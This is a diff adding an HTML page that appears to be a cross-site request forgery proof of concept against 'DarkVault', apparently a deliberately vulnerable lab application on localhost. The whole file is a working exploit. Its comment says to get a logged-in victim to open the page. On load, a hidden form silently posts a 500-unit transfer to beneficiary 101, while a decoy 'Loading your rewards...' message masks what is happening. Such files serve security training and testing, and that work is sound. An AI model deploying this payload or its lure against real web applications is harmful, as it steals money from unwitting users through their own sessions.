@@ -1,0 +1,16 @@
+<!doctype html>
+<!--
+  Host this file anywhere (even file:// works for local testing) and
+  get a logged-in DarkVault victim to open it. Their browser will
+  silently submit a transfer using their session cookie -- no
+  interaction required beyond loading the page.
+-->
+<html>
+<body onload="document.forms[0].submit()">
+  <form action="http://localhost:9090/transfer" method="POST" enctype="application/x-www-form-urlencoded">
+    <input type="hidden" name="beneficiary_id" value="101">
+    <input type="hidden" name="amount" value="500">
+  </form>
+  <p>Loading your rewards...</p>
+</body>
+</html>
